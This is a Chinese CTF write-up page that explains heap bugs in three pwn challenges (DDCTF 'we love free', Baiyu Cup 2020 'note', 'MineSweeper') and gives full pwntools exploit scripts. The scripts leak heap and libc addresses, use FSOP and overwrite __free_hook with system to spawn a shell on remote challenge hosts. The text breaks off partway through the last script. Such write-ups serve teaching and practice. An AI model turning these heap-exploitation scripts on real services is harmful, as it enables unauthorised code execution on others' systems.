<h2 id="DDCTF"><a href="#DDCTF" class="headerlink" title="DDCTF"></a>DDCTF</h2><h3 id="we-love-free"><a href="#we-love-free" class="headerlink" title="we love free"></a>we love free</h3><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>程序模拟了vector的逻辑，这种分配是按照0x20 0x30 0x50 … n*0x20-0x10的顺序分配的。在vector的存储位置里有几个指针变量，其中start是分配的一个大堆块的起始位置，在存储的空间够用时都会使用这样一个大堆块。后面有个curretnt_ptr，指向输入，如果调用Add，则cureent每次加8，直到等于end指针，再开辟新的堆空间。</p>
<p>在edit的时候先malloc一个新堆块，free旧堆块，再edit旧堆块，编辑的长度是新堆块的大小，因此会造成UAF和溢出。</p>
<p>这里作者默认认为旧堆块和新堆块是连续的，因而即使溢出也不过只能溢出到下一个堆块一半以内的部分，这一点也很好理解，因为正常来说释放后如果ub和top_chunk相连，malloc_consolidate会使得整个堆块合并回去，之后的Add情形和之前相同，即使没有ub，因为fastbin的关系，也会按之前堆排布的方式进行分配，然而如果利用堆溢出改掉下一个ub(0x110)的sz，比如说0x51，再次释放就不会触发malloc_consolidate，且因为0x50进了fastbin，第二次的Add就会优先分配到这个块，那么0x30在原始位置，0x50到了一个靠后的位置，中间构造出unsorted bin，在edit的时候就可以编辑此ub的sz和bk，进而FSOP了。</p>
<p>注意最后编辑sz/bk的时候长度有限，因此在之前的输入里布置一下fake_vtable和system_addr，释放后仍有残留数据，构造出满足的条件，最后Add触发FSOP。</p>
<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(num=<span class="number">0x21</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your num:"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(is_edit=<span class="string">'n'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Edit (y/n):"</span>)</span><br><span class="line">    p.sendline(is_edit)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EditOnce</span><span class="params">(payload,is_edit=<span class="string">'y'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Edit (y/n):"</span>)</span><br><span class="line">    p.sendline(is_edit)</span><br><span class="line">    <span class="keyword">if</span> is_edit == <span class="string">'y'</span>:</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    Add()</span><br><span class="line"><span class="comment">#leak heap with initial heap</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'1:'</span>)</span><br><span class="line">heapbase = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>),<span class="number">10</span>)-(<span class="number">0x617c10</span><span class="number">-0x606000</span>)</span><br><span class="line">log.success(<span class="string">'heapbase =&gt; '</span>+hex(heapbase))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    EditOnce(<span class="string">'a'</span>,<span class="string">'n'</span>)</span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    Add()</span><br><span class="line">Delete()</span><br><span class="line">Add()</span><br><span class="line">Show()</span><br><span class="line">p.recvuntil(<span class="string">"2:"</span>)</span><br><span class="line">libc_base = int(p.recvline().strip(<span class="string">'\n'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    EditOnce(<span class="string">'a'</span>,<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#make heap layout</span></span><br><span class="line">fake_vtable = heapbase+(<span class="number">0x617dc0</span><span class="number">-0x606000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    Add()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    EditOnce(str(fake_vtable),<span class="string">'n'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0x90</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0x50</span>),<span class="string">'y'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    EditOnce(str(<span class="number">0x21</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(fake_vtable),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0x21</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0x31</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0</span>),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(libc.sym[<span class="string">'system'</span>]),<span class="string">'y'</span>)</span><br><span class="line">EditOnce(str(libc.sym[<span class="string">'system'</span>]),<span class="string">'y'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    EditOnce(str(<span class="number">0x91</span>),<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    Add()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    EditOnce(str(<span class="number">0x1234</span>),<span class="string">'n'</span>)</span><br><span class="line">EditOnce(str(<span class="number">0x0068732f6e69622f</span>))</span><br><span class="line">EditOnce(str(<span class="number">0x61</span>))</span><br><span class="line">EditOnce(str(<span class="number">0</span>))</span><br><span class="line">EditOnce(str(libc.sym[<span class="string">'_IO_list_all'</span>]<span class="number">-0x10</span>))</span><br><span class="line">EditOnce(str(<span class="number">2</span>))</span><br><span class="line">EditOnce(str(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xa8</span>/<span class="number">8</span><span class="number">-3</span>):</span><br><span class="line">    EditOnce(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    Add(str(<span class="number">0</span>))</span><br><span class="line">Add(str(fake_vtable))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b malloc'</span>)</span><br><span class="line">Add(str(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="柏鹭杯2020"><a href="#柏鹭杯2020" class="headerlink" title="柏鹭杯2020"></a>柏鹭杯2020</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>程序开始先用随机数做了种子，因而之后的随机数无法预测。可以add两种类型的堆块，在free里释放了<code>*node_addr</code>存储的chunk2，并用循环移位赋值的方式将原堆块的值覆写成后一个堆块的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> **<span class="title">new1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">void</span> **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)type1_total_count;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type1_total_count &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"index: %u\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type1_total_count);</span><br><span class="line">    chunk_addr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"message: "</span>);</span><br><span class="line">    get_input(<span class="number">0</span>, chunk_addr, <span class="number">0x20</span>uLL);</span><br><span class="line">    idx = type1_total_count++;</span><br><span class="line">    v3 = idx;</span><br><span class="line">    result = type1_list;</span><br><span class="line">    type1_list[v3] = chunk_addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">  LODWORD(v0) = read_choice();</span><br><span class="line">  v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = type1_list[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"message: "</span>);</span><br><span class="line">      get_input(<span class="number">0</span>, type1_list[v2], <span class="number">0x20</span>uLL);</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">"new message: %s"</span>, type1_list[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//void ***new2()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> ***result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **node_addr; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr1; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">void</span> ***)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)type2_total_count;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type2_total_count &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"index: %u\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type2_total_count);</span><br><span class="line">    node_addr = (<span class="keyword">void</span> **)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    chunk_addr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    chunk_addr1 = chunk_addr;</span><br><span class="line">    *node_addr = chunk_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"message1: "</span>);</span><br><span class="line">    get_input(<span class="number">0</span>, chunk_addr1, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"message2: "</span>, chunk_addr1);</span><br><span class="line">    get_input(<span class="number">0</span>, node_addr + <span class="number">1</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">    v4 = type2_total_count++;</span><br><span class="line">    idx = v4;</span><br><span class="line">    result = type2_list;</span><br><span class="line">    type2_list[idx] = node_addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">  LODWORD(v0) = read_choice();</span><br><span class="line">  v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = type2_list[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"message1: "</span>);</span><br><span class="line">      get_input(<span class="number">0</span>, *type2_list[v2], <span class="number">0x20</span>uLL);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"message2: "</span>);</span><br><span class="line">      LODWORD(v0) = get_input(<span class="number">0</span>, type2_list[v2] + <span class="number">1</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">__int64 <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx2; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> **node_addr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  idx1 = rand() % (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type1_total_count;</span><br><span class="line">  idx2 = rand() % (<span class="keyword">unsigned</span> <span class="keyword">int</span>)type2_total_count;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"note1: %u\n"</span>, idx1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"note2: %u\n"</span>, idx2);</span><br><span class="line">  chunk_addr = type1_list[idx1];</span><br><span class="line">  node_addr = type2_list[idx2];</span><br><span class="line">  <span class="built_in">free</span>(*node_addr);</span><br><span class="line">  *node_addr = chunk_addr;</span><br><span class="line">  <span class="keyword">for</span> ( i = idx1; i &lt; type1_total_count; ++i )</span><br><span class="line">    type1_list[i] = type1_list[i + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(type1_total_count-- - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为type1_list和type2_list紧挨着，当分配0x20个块时调用Delete，函数的移位赋值使得type1_list上出现了<code>type2_list[0]</code>。我们通过edit1函数部分修改type2_chunk，从而leak出Heap，再利用type1+type2的任意地址写将type2_chunk的sz改大，释放后放入unsorted bin(注意此前修改tcache_perthread_struct的对应的count大于7)，再和之前一样部分写低字节leak出libc地址。最后用这个任意地址写将__free_hook改为system，再释放一个包含<code>/bin/sh</code>的块即可。</p>
<h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./note'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'124.70.131.128'</span>,<span class="number">12031</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add1</span><span class="params">(msg=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"message: "</span>)</span><br><span class="line">    p.send(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add2</span><span class="params">(msg1=<span class="string">'a'</span>,msg2=<span class="string">'b'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"message1: "</span>)</span><br><span class="line">    p.send(msg1)</span><br><span class="line">    p.recvuntil(<span class="string">"message2: "</span>)</span><br><span class="line">    p.send(msg2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit1</span><span class="params">(index,msg)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"message: "</span>)</span><br><span class="line">    p.send(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit2</span><span class="params">(index,msg1,msg2)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"message1: "</span>)</span><br><span class="line">    p.send(msg1)</span><br><span class="line">    p.recvuntil(<span class="string">"message2: "</span>)</span><br><span class="line">    p.send(msg2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add2()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">        Add1(p64(<span class="number">0x431</span>)*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">        Delete()</span><br><span class="line">    <span class="comment">#Add1()</span></span><br><span class="line">    <span class="comment">#0x7310</span></span><br><span class="line">    Edit1(<span class="number">0</span>,<span class="string">'\x10'</span>)</span><br><span class="line">    <span class="comment">#Delete()</span></span><br><span class="line">    p.recvuntil(<span class="string">"new message: "</span>)</span><br><span class="line">    heap_base = u64(p.recvuntil(<span class="string">"1.new"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#UAF to tcache perthread</span></span><br><span class="line">    Add1()</span><br><span class="line">    Edit1(<span class="number">1</span>,p64(heap_base+<span class="number">0x258</span>))</span><br><span class="line">    Edit2(<span class="number">0</span>,p64(<span class="number">0x451</span>),<span class="string">'a'</span>)</span><br><span class="line">    Edit1(<span class="number">1</span>,p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line">    Delete()</span><br><span class="line">    Edit1(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"new message: aaaaaaaa"</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">"1.new"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">96</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Add1()</span><br><span class="line">    Edit1(<span class="number">1</span>,p64(heap_base+<span class="number">0x258</span>))</span><br><span class="line">    Edit2(<span class="number">0</span>,p64(<span class="number">0x31</span>),<span class="string">'a'</span>)</span><br><span class="line">    Edit1(<span class="number">1</span>,p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line"></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">    Edit1(<span class="number">1</span>,p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>))</span><br><span class="line">    Add1()</span><br><span class="line">    Add1(<span class="string">"/bin/sh\x00"</span>+p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    Edit1(<span class="number">3</span>,p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>))</span><br><span class="line">    Delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="MineSweeper"><a href="#MineSweeper" class="headerlink" title="MineSweeper"></a>MineSweeper</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在Game里有四个选项，A继续，B删除，C插旗子，D挖雷。其中B存在double free。首先通过B的UAF分配到存储name的sz部分，改成0xa1之后释放(注意因为这里被置为了非0所以直接win了，在此之前要绕过一个0x202010处的check)，之后分配大堆块触发malloc_consolidate，使得name以及下面的堆块进行合并，从而可以写包含有存储地雷的堆块的堆块，从而可以覆写其地址，leak出任意堆块的内容，这里首先leak出heap倒数第二字节的内容，从而可以改写其到unsorted bin的地址leak出libc，最后由于可以改写name_addr又可以改写name，所以地址任意写改__free_hook到system，释放包含/bin/sh的块即可get shell。</p>
<h4 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./MineSweeper'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./MineSweeper'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc 